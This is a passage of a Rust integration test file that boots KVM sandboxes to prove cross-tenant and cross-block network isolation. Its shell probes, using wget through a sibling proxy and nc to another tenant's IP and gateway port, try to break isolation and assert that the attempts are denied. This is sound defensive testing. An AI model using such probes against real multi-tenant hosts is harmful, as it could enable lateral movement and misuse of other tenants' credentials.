    // workload path mangles multi-line `sh -c` scripts (a comment line can eat
    // the rest of the joined script), so the whole probe stays on a single line.
    // Probe (1) is the positive control — A reaching the shared upstream through
    // its OWN injected PEP (the pin permits A's own PEP port). Probe (2) is the
    // H1 case — overriding the proxy env to B's gateway:port, which the netns
    // pin must drop. Every probe is hard-bounded by `timeout` so a DROPped
    // connection (no RST) cannot hang past its budget.
    format!(
        r#"TMP=/nimbus-egress/result.tmp; : > "$TMP"; if timeout 8 wget -T 5 -q -O /tmp/own "http://127.0.0.1:{upstream_port}/allowed" && grep -q shared-upstream-body /tmp/own; then echo own_pep=allowed >> "$TMP"; else echo own_pep=denied >> "$TMP"; fi; if http_proxy={sibling_proxy_url} HTTP_PROXY={sibling_proxy_url} timeout 8 wget -T 5 -q -O /tmp/sib "http://127.0.0.1:{upstream_port}/allowed"; then echo sibling_pep_reach=allowed >> "$TMP"; else echo sibling_pep_reach=denied >> "$TMP"; fi; mv "$TMP" {RESULT_PATH_IN_GUEST}; sleep 30"#
    )
}

/// MTN5 cross-tenant isolation proof: two DIFFERENT tenants get distinct
/// per-tenant bridges (`nb-0` / `nb-1`), and the netavark `isolate` option
/// installs a FORWARD DROP between them, so tenant B cannot reach tenant A's
/// sandbox IP even though both bridges live in the host root netns with
/// `ip_forward` on. A positive control (`own_egress=allowed`) proves B's own
/// egress works, so the denial is isolation, not a broken network.
///
/// Assignment is deterministic on a fresh state root: tenant A (assigned first)
/// gets `10.0.0.0/24` (sandbox `10.0.0.2`), tenant B gets `10.0.1.0/24`.
#[test]
#[ignore = "requires a Linux root host with /dev/kvm plus the full krun OCI runtime stack; boots two tenants to prove cross-tenant bridge isolation"]
fn krun_two_tenants_cannot_reach_each_others_sandbox() {
    assert_egress_proof_preconditions();

    let upstream = TestHttpServer::start("shared-upstream-body");
    let upstream_port = upstream.addr.port();
    let policy = parity_policy(upstream_port);
    let image = env::var("NIMBUS_KRUN_EGRESS_IMAGE")
        .unwrap_or_else(|_| "docker://busybox:latest".to_owned());
    let (_temp, workdir) = test_workdir("krun-cross-tenant");
    let backend = KrunSandboxBackend::new(egress_backend_config(&workdir, 15700));

    // Tenant A (first -> 10.0.0.0/24, sandbox 10.0.0.2): serve a sentinel on
    // :9000 in its own netns and stay alive.
    let tenant_a = TenantId::new("cross-tenant-a").expect("tenant id should parse");
    let a_command = "while true; do printf 'HTTP/1.1 200 OK\\r\\nContent-Length: 10\\r\\nConnection: close\\r\\n\\r\\nA-SENTINEL' | nc -l -p 9000; done".to_owned();
    let a_spec = SandboxSpec::new(
        tenant_a.clone(),
        SandboxOwnerSpec::standalone_named("cross-tenant-a"),
        SandboxBackendKind::Krun,
        SandboxRootSpec::oci_image_reference(image.clone()),
        SandboxProcessSpec::new(Vec::<String>::new())
            .with_entrypoint(["/bin/sh", "-c"])
            .with_command([a_command]),
    )
    .with_egress_policy(policy.clone());
    let a_provisioned = provision_krun(&backend, &workdir.join("state"), a_spec, false)
        .expect("tenant A provision phases should activate");
    assert!(a_provisioned.ingress.is_empty());
    let a_handle = a_provisioned.handle;
    let _a_teardown = ForceTeardownGuard::new(
        backend.clone(),
        a_handle.id.clone(),
        sandbox_netns_path(&workdir, &tenant_a, &a_handle.id),
    );

    // Tenant B (second -> 10.0.1.0/24): reach its OWN PEP (positive control) but
    // NOT tenant A's sandbox IP 10.0.0.2:9000 (blocked by the isolate FORWARD DROP).
    let tenant_b = TenantId::new("cross-tenant-b").expect("tenant id should parse");
    let b_command = format!(
        r#"TMP=/nimbus-egress/result.tmp; : > "$TMP"; if timeout 8 wget -T 5 -q -O /tmp/own "http://127.0.0.1:{upstream_port}/allowed" && grep -q shared-upstream-body /tmp/own; then echo own_egress=allowed >> "$TMP"; else echo own_egress=denied >> "$TMP"; fi; if timeout 8 wget -T 5 -q -O /tmp/x "http://10.0.0.2:9000/" && grep -q A-SENTINEL /tmp/x; then echo cross_tenant_reach=allowed >> "$TMP"; else echo cross_tenant_reach=denied >> "$TMP"; fi; mv "$TMP" {RESULT_PATH_IN_GUEST}; sleep 30"#
    );
    let b_spec = SandboxSpec::new(
        tenant_b.clone(),
        SandboxOwnerSpec::standalone_named("cross-tenant-b"),
        SandboxBackendKind::Krun,
        SandboxRootSpec::oci_image_reference(image),
        SandboxProcessSpec::new(Vec::<String>::new())
            .with_entrypoint(["/bin/sh", "-c"])
            .with_command([b_command]),
    )
    .with_mount(SandboxMountSpec::tenant_volume(
        RESULT_VOLUME,
        "/nimbus-egress",
    ))
    .with_egress_policy(policy);
    let b_provisioned = provision_krun(&backend, &workdir.join("state"), b_spec, false)
        .expect("tenant B provision phases should activate");
    assert!(b_provisioned.ingress.is_empty());
    let b_handle = b_provisioned.handle;
    let _b_teardown = ForceTeardownGuard::new(
        backend.clone(),
        b_handle.id.clone(),
        sandbox_netns_path(&workdir, &tenant_b, &b_handle.id),
    );

    let b_result_path = tenant_volume_path(&workdir, &tenant_b, RESULT_VOLUME).join("result");
    let b_result = wait_for_result(
        &b_result_path,
        Duration::from_secs(60),
        "tenant B cross-tenant result",
    );

    // Positive control: B's own egress works (the denial below is isolation).
    assert_result_line(&b_result, "own_egress=allowed");
    // The MTN5 guarantee: B cannot reach a different tenant's sandbox.
    assert_result_line(&b_result, "cross_tenant_reach=denied");
}

/// Does a bridge interface with this name exist on the host? (Run under sudo.)
fn host_bridge_exists(interface: &str) -> bool {
    std::process::Command::new("ip")
        .args(["link", "show", interface])
        .output()
        .map(|output| output.status.success())
        .unwrap_or(false)
}

/// MTN6 on-demand multi-block, proven on real KVM. With a `/30` per-tenant prefix
/// (one host address per block), a tenant's SECOND sandbox exhausts its first
/// block and GROWS onto a new sibling block bridge (`nb-1`) — the grow path
/// (`place_sandbox_config` -> `grow_block`) end-to-end. The grown-block sandbox
/// boots on the new bridge, gets an address in the SECOND block, and reaches its
/// OWN on-link PEP (positive control); both block bridges exist on the host.
#[test]
#[ignore = "requires /dev/kvm + root; run explicitly on the Linux KVM proof box"]
fn krun_tenant_grows_onto_a_second_block_when_the_first_is_full() {
    assert_egress_proof_preconditions();

    let upstream = TestHttpServer::start("grow-upstream-body");
    let upstream_port = upstream.addr.port();
    let policy = parity_policy(upstream_port);
    let image = env::var("NIMBUS_KRUN_EGRESS_IMAGE")
        .unwrap_or_else(|_| "docker://busybox:latest".to_owned());
    let (_temp, workdir) = test_workdir("krun-grow-block");
    // A `/30` per-tenant prefix packs ONE host address per block, so the tenant's
    // second sandbox forces a grow onto a new block bridge.
    let mut config = egress_backend_config(&workdir, 15800);
    config.node_tenant_subnet_prefix = 30;
    let backend = KrunSandboxBackend::new(config);

    let tenant = TenantId::new("grow-tenant").expect("tenant id should parse");

    // Sandbox 1 takes the tenant's PRIMARY block (index 0 -> nb-0, 10.0.0.2).
    let s1_spec = SandboxSpec::new(
        tenant.clone(),
        SandboxOwnerSpec::standalone_named("grow-one"),
        SandboxBackendKind::Krun,
        SandboxRootSpec::oci_image_reference(image.clone()),
        SandboxProcessSpec::new(Vec::<String>::new())
            .with_entrypoint(["/bin/sh", "-c"])
            .with_command(["sleep 120".to_owned()]),
    )
    .with_egress_policy(policy.clone());
    let s1_provisioned = provision_krun(&backend, &workdir.join("state"), s1_spec, false)
        .expect("sandbox 1 provision phases should activate");
    assert!(s1_provisioned.ingress.is_empty());
    let s1_handle = s1_provisioned.handle;
    let _s1_teardown = ForceTeardownGuard::new(
        backend.clone(),
        s1_handle.id.clone(),
        sandbox_netns_path(&workdir, &tenant, &s1_handle.id),
    );

    // Sandbox 2 for the SAME tenant cannot fit the `/30`, so placement grows a new
    // block bridge (index 1 -> nb-1, host .6 in the second block). Report its own
    // guest IP and probe its OWN egress PEP.
    let s2_command = format!(
        r#"TMP=/nimbus-egress/result.tmp; : > "$TMP"; if timeout 8 wget -T 5 -q -O /tmp/own "http://127.0.0.1:{upstream_port}/allowed" && grep -q grow-upstream-body /tmp/own; then echo own_egress=allowed >> "$TMP"; else echo own_egress=denied >> "$TMP"; fi; if timeout 4 nc -w 2 10.0.0.1 15800 </dev/null >/dev/null 2>&1; then echo sibling_pep_reach=allowed >> "$TMP"; else echo sibling_pep_reach=denied >> "$TMP"; fi; mv "$TMP" {RESULT_PATH_IN_GUEST}; sleep 30"#
    );
    let s2_spec = SandboxSpec::new(
        tenant.clone(),
        SandboxOwnerSpec::standalone_named("grow-two"),
        SandboxBackendKind::Krun,
        SandboxRootSpec::oci_image_reference(image),
        SandboxProcessSpec::new(Vec::<String>::new())
            .with_entrypoint(["/bin/sh", "-c"])
            .with_command([s2_command]),
    )
    .with_mount(SandboxMountSpec::tenant_volume(
        RESULT_VOLUME,
        "/nimbus-egress",
    ))
    .with_egress_policy(policy);
    let s2_provisioned = provision_krun(&backend, &workdir.join("state"), s2_spec, false)
        .expect("sandbox 2 provision phases should grow a block and activate");
    assert!(s2_provisioned.ingress.is_empty());
    let s2_handle = s2_provisioned.handle;
    let _s2_teardown = ForceTeardownGuard::new(
        backend.clone(),
        s2_handle.id.clone(),
        sandbox_netns_path(&workdir, &tenant, &s2_handle.id),
    );

    let s2_result_path = tenant_volume_path(&workdir, &tenant, RESULT_VOLUME).join("result");
    let s2_result = wait_for_result(
        &s2_result_path,
        Duration::from_secs(60),
        "grown-block sandbox result",
    );

    // Positive control: the grown-block sandbox reaches its OWN on-link PEP (bound
    // on the grown block's gateway). This is what the grow-egress bug broke — the
    // grown sandbox's veth landed in the wrong block (a shared-cursor IPAM bug) so
    // its PEP was off-link. (The guest is a libkrun/TSI VMM with no normal eth0 IP,
    // so we assert reachability, not a guest address, matching the MTN5 proof.)
    assert_result_line(&s2_result, "own_egress=allowed");
    // SECURITY invariant (H1, for grown blocks): enabling the grown block's egress
    // must NOT open a hole. The grown-block sandbox must NOT reach the SIBLING
    // block's PEP (the primary block 0's PEP on 10.0.0.1:15800) — that would let it
    // egress under another sandbox's policy + injected credentials. The H1 pin
    // (allow ONLY own PEP), no_default_route (off-link), and the isolate FORWARD
    // drop each block it; the grow path must preserve all three, not just function.
    assert_result_line(&s2_result, "sibling_pep_reach=denied");
    // Both of the tenant's block bridges exist on the host (grew one -> two),
    // confirming a distinct second block bridge was stood up.
    assert!(
        host_bridge_exists("nb-0"),
        "the tenant's first block bridge nb-0 must exist"
    );
    assert!(
        host_bridge_exists("nb-1"),
        "the grown second block bridge nb-1 must exist"
    );
}
